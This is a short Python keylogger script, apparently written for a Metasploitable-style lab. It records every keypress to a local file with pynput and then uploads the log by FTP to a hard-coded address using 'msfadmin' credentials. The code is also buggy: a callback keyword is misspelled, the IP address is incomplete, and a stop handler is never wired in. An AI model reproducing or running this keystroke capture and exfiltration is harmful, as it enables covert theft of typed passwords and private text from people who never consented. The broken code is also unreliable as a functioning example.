import ftplib
import logging
from pynput.keyboard import Key,Listener 

logdir =''

logging.basicConfig(filename=(logdir+"klogs002.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s")

def pressing_key(Key):
    try:
        logging.info(str(Key))
    except AttributeError:
        print("A special key {0} is pressed ".format(Key))

def releasing_key(key):
    if Key == key.esc:
        print("False")
skey = "*"
def stop(Key):
    if Key == skey:
        print("stopped")
        exit
        
print('\nStart Listening..\n')

with Listener(on_press=pressing_key,on_relase=releasing_key) as listener:
    listener.join()

print("\nConnectiong to the FTP module and sending the data..")

sess= ftplib.FTP("192.168.68", "msfadmin", "msfadmin")
file = open("klogs002.txt","rb")
sess.storbinary("STOR klogs002.txt",file)
file.close()
sess.quit()
